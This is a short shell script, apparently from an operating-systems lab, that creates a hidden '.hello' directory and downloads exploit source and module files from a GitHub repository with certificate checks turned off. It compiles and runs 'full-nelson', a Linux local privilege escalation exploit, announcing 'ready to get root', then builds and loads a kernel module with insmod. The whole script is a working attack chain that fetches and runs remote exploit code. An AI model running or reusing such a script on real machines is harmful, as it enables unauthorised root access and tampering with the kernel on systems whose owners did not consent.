#!/bin/sh

mkdir .hello
cp exploit.sh ./.hello

cd ./.hello
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/full-nelson.c
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/hello.c
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/insmod.sh
wget --no-check-certificate https://raw.githubusercontent.com/yangbyangb/OSlab/master/Makefile

echo "ready to get root"
gcc full-nelson.c -o full-nelson
./full-nelson

make
insmod hello.ko
lsmod | grep hello
echo "done with the module"

